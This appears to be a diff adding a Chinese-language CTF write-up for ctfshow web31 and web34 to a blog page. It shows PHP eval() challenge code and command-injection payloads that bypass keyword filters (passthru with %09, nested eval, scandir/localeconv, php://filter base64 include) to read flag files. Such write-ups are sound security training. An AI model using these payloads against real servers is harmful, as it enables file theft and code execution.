@@ -485,21 +485,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-19
+                    2022-12-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.4k
+                    4.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    13 分
+                    17 分
                 </div>
                 
 
@@ -713,6 +713,77 @@ echo mt_rand()+mt_rand();<span aria-hidden="true" class="line-numbers-rows"><spa
            echo $flag;
        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>令r&#x3D;1374935140可以使得!$rand为真,然后执行if语句，如果cookie传入值正确，得出flag。<br>利用hackbar进行get传参，进行cookie传参得到flag。</p>
+<h2 id="命令执行篇"><a href="#命令执行篇" class="headerlink" title="命令执行篇"></a>命令执行篇</h2><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
+
+&#x2F;*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:49:10
+# @email: h1xa@ctfer.com
+# @link: https:&#x2F;&#x2F;ctfer.com
+
+*&#x2F;
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其中有一部分：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">$c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过GET传参的方式传入c，传入c的内容中过滤掉了flag system  php cat sort shell 英文句号（.） 空格（ ） 单引号（’）。那么我们可以找一些和他们功能相似的命令。<br>       比如：<br>与**system()<strong>功能相似的命令有</strong>exec()<strong>、</strong>passthru()<strong>、</strong>shell_exec()**。<br>与cat命令功能相似的命令：</p>
+<p><em>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;报错出文件内容</em></p>
+<p>空格被过滤掉可以用%09代替。<br>我们get传入**?c&#x3D;passthru(“ls”);**<br><img src="https://img-blog.csdnimg.cn/b63bb7e45461489299cab133c3bc4d75.png" alt="31"><br>然后重新传入**?c&#x3D;passthru(“tac%09fla*”);<em><em>得到flag。<br><strong>还可以：</strong><br>       1 &gt;使用eval嵌套。具体参数：passthru 结合%09<br>其中%09绕过空格 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac%09fla</em>“); 这里需要注意括号的闭合，&amp;的连接。<br>       2&gt; 使用pos(localeconv)来获取小数点<br><strong>localeconv</strong>可以返回包括小数点在内的一个数组；</em><em>pos<strong>去取出数组中当前第一个元素，也就是小数点。 <strong>scandir</strong>可以结合它扫描当前目录内容。 <strong>?c&#x3D;print_r(scandir(pos(localeconv())));</strong> 可以看到当前目录下有flag.php 通过</strong>array_reverse<strong>把数组逆序，通过next取到第二个数组元素，也即flag.php 然后</strong>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));*</em></p>
+<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
+
+&#x2F;*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 04:21:29
+# @email: h1xa@ctfer.com
+# @link: https:&#x2F;&#x2F;ctfer.com
+*&#x2F;
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c &#x3D; $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;&#x2F;i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到，被过滤的更多了</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;&#x2F;i&quot;, $c))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>用php伪协议:<br>传入**?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php**<br>得到一串base64加密过的值:<br><em>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7ODUxZjI3ZjgtNWY5Yy00YTZhLTg5NjctNjIwMzUwNDhmZWMwfSI7DQo&#x3D;</em><br>,然后开始解密得到</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+
+&#x2F;*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:49:19
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:49:26
+# @email: h1xa@ctfer.com
+# @link: https:&#x2F;&#x2F;ctfer.com
+
+*&#x2F;
+
+$flag&#x3D;&quot;ctfshow&#123;851f27f8-5f9c-4a6a-8967-62035048fec0&#125;&quot;;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -1564,7 +1635,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.1k</span>&nbsp;字
+                class="white-color">7.9k</span>&nbsp;字
             
             
             
